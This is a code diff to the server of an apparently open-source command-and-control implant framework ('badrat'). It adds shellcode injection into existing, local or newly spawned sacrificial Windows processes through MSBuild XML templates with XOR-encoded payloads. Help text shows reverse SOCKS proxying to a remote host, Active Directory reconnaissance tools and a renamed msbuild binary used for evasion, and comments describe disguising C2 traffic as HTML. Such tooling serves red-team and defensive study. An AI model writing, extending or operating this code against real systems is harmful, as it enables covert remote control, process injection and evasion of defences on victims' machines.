@@ -40,9 +40,13 @@ redirect_url = args.redirect_url
 if(not str.startswith("http://", redirect_url) or not str.startswith("https://", redirect_url)):
     redirect_url = "http://" + redirect_url
 
-supported_types = ["c", "c#", "js", "ps1", "hta"]
 default_msbuild_path = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild"
 msbuild_path = default_msbuild_path
+
+default_shellcode_process = "C:\\Windows\\System32\\SearchProtocolHost.exe" # Default sacrificial process for creating a new process then injecting shellcode
+shellcode_process = default_shellcode_process
+
+supported_types = ["c", "c#", "js", "ps1", "hta"]
 alpha = "abcdefghijklmnopqrstuvwxyz"
 
 # Generate a random path to serve payloads off of
@@ -65,7 +69,7 @@ links = {}
 # Tab completion stuff -- https://stackoverflow.com/questions/5637124/tab-completion-in-pythons-raw-input
 class Completer(object):
     def __init__(self):
-        self.tab_cmds = ['all', 'rats', 'download', 'upload', 'psh', 'csharp', 'spawn', 'quit', 'back', 'exit', 'help', 'remove', 'clear', 'stagers', "shellcode", "eval", "note", "set-msbuild-path", "link", "unlink", "exec"]
+        self.tab_cmds = ['all', 'rats', 'download', 'upload', 'psh', 'csharp', 'spawn', 'quit', 'back', 'exit', 'help', 'remove', 'clear', 'stagers', "shellcode", "eval", "note", "set-msbuild-path", "set-shellcode-process", "link", "unlink", "exec"]
         self.re_space = re.compile('.*\s+$', re.M)
 
     def add_tab_item(self, item):
@@ -187,9 +191,23 @@ def pretty_print_banner():
     $$ |  $$ | $$$$$$$ |$$ /  $$ |$$ |  \__| $$$$$$$ |  $$ |    \$$$$$$\        (    / _/    /' o O| ,_( ))___     (`
     $$ |  $$ |$$  __$$ |$$ |  $$ |$$ |      $$  __$$ |  $$ |$$\  \____$$\        ` -|   )_  /o_O_'_(  \\'    _ `\    )
     $$$$$$$  |\$$$$$$$ |\$$$$$$$ |$$ |      \$$$$$$$ |  \$$$$  |$$$$$$$  |          `"\"\"\"`            =`---<___/---'
-    \_______/  \_______| \_______|\__|       \_______|   \____/ \_______/  v2.0.1 Imagine the Graph       "`
+    \_______/  \_______| \_______|\__|       \_______|   \____/ \_______/  v2.1.1 Injection addict        "`
     """
     pretty_print(banner)
+
+def set_shellcode_process(inp):
+    global shellcode_process, default_shellcode_process
+    path = ' '.join(inp.split(" ")[1:])
+    if(path == "" or path == " "):
+        pretty_print("Usage: set-shellcode-process <process_to_create.exe>")
+        pretty_print("Use \"set-shellcode-process default\" to restore to default (" + default_shellcode_process + ")")
+        return
+    if(path == "default"):
+        pretty_print("Resetting sacrifical shellcode process to default: " + colors(default_shellcode_process))
+        shellcode_process = default_shellcode_process
+    else:
+        pretty_print("Setting shellcode sacrifical process path to: " + colors(path))
+        shellcode_process = path
 
 def set_msbuild_path(inp):
     global msbuild_path, default_msbuild_path
@@ -202,7 +220,7 @@ def set_msbuild_path(inp):
         pretty_print("Resetting msbuild path to default: " + colors(default_msbuild_path))
         msbuild_path = default_msbuild_path
     else:
-        pretty_print("Setting msbuild path to " + colors(path))
+        pretty_print("Setting msbuild path to: " + colors(path))
         msbuild_path = path
 
 # Wrap C2 comms in html and html2 code to make requests look more legitimate
@@ -407,14 +425,29 @@ def send_invoke_assembly(input_data):
     return(b64data)
 
 def send_shellcode_msbuild_xml(input_data, ratID):
-    shellcode_path = input_data.split(" ")[1]
-    with open(os.getcwd() + "/resources/shellcode_modified.xml", "r") as fd:
+    arg1 = input_data.split(" ")[1]
+    pid = "0";
+    if(arg1.isdigit()): # if your shellcode path name is a number you're retarded
+        pid = arg1
+        shellcode_path = input_data.split(" ")[2]
+        shellcode_template = "shellcode_injectproc.xml"
+    elif(arg1 == "local"):
+        pid = "0"
+        shellcode_path = input_data.split(" ")[2]
+        shellcode_template = "shellcode_injectproc.xml"
+    else: # Not local or no pid specified, create a new process to inject into
+        shellcode_path = arg1
+        shellcode_template = "shellcode_createproc.xml"
+
+    with open(os.getcwd() + "/resources/" + shellcode_template, "r") as fd:
         msbuild_data = fd.read()
 
     with open(Path(shellcode_path).resolve() , "rb") as fd:
         shellcode_data = fd.read()
 
     msbuild_data = msbuild_data.replace("~~KEY~~",  ratID)
+    msbuild_data = msbuild_data.replace("~~PROCESSPATH~~",  shellcode_process)
+    msbuild_data = msbuild_data.replace("~~PID~~",  pid)
     msbuild_data = msbuild_data.replace("~~SHELLCODE~~", xor_crypt_and_encode(shellcode_data, ratID))
 
     b64data = base64.b64encode(msbuild_data.encode('utf-8')).decode('utf-8')
@@ -720,6 +753,9 @@ def get_help():
     pretty_print("set-msbuild-path -- Sets an alternate path for msbuild. Affects all rats (global scope)")
     pretty_print("example: set-msbuild-path C:\\windows\\temp\\definitely-not-msbuild.exe")
     pretty_print("example: set-msbuild-path default")
+    pretty_print("set-shellcode-process -- Sets an alternate path to create processes to inject into. Affects all rats (global scope)")
+    pretty_print("example: set-shellcode-process notepad.exe")
+    pretty_print("example: set-shellcode-process default")
     pretty_print("")
     pretty_print("Rat commands: -- commands to interact with a badrat rat")
     pretty_print("<command> -- enter shell commands to run on the rat. Uses cmd.exe or powershell.exe depending on rat type")
@@ -734,7 +770,7 @@ def get_help():
     pretty_print("example: psh script/Invoke-SocksProxy.ps1 Invoke-ReverseSocksProxy -remotePort 4444 -remoteHost 12.23.34.45")
     pretty_print("csharp <local_c_sharp_exe_path> <command_arguments> -- Runs the assembly on the remote host using MSBuild.exe and a C Sharp reflective loader stub")
     pretty_print("example: csharp scripts/Snaffler.exe --domain borgar.local --stdout")
-    pretty_print("shellcode <local_shellcode.bin_path> -- Runs the specified shellcode in a new process using MSBuild.exe and a C Sharp injection stub")
+    pretty_print("shellcode [pid|local] <local_shellcode.bin_path> -- Runs the specified shellcode in the specified PID (or the local process) or create a new process (using the process set with set-shellcode-process) using MSBuild.exe and a C Sharp injection stub")
     pretty_print("upload -- Uploads file from C2 server to rat host")
     pretty_print("example: upload scripts/Invoke-Bloodhound.ps1 C:\\users\\localadmin\\desktop\\ibh.ps1")
     pretty_print("download -- downloads the specified file from the rat host")
@@ -786,6 +822,10 @@ if __name__ == "__main__":
             # Set the msbuild path
             elif(str.startswith(inp, "set-msbuild-path")):
                 set_msbuild_path(inp)
+
+            # Set the shellcode process
+            elif(str.startswith(inp, "set-shellcode-process")):
+                set_shellcode_process(inp)
 
             elif(str.startswith(inp, "stagers")):
                 try:
@@ -849,6 +889,11 @@ if __name__ == "__main__":
                             get_help()
                             continue
 
+                        # Set the shellcode process
+                        elif(str.startswith(inp, "set-shellcode-process")):
+                            set_shellcode_process(inp)
+                            continue
+
                         # Set the msbuild path
                         elif(str.startswith(inp, "set-msbuild-path")):
                             set_msbuild_path(inp)
@@ -908,8 +953,9 @@ if __name__ == "__main__":
                                     inp = "shc " + encode_file(filepath)
                                 else:
                                     inp = "shc " + msbuild_path + " " + send_shellcode_msbuild_xml(inp, ratID)
-                            except:
+                            except Exception as e:
                                 pretty_print("[!] Could not open file " + colors(filepath) + " for reading or other unexpected error occured")
+                                print(e.message)
                                 continue
 
                         elif(str.startswith(inp, "eval ")):
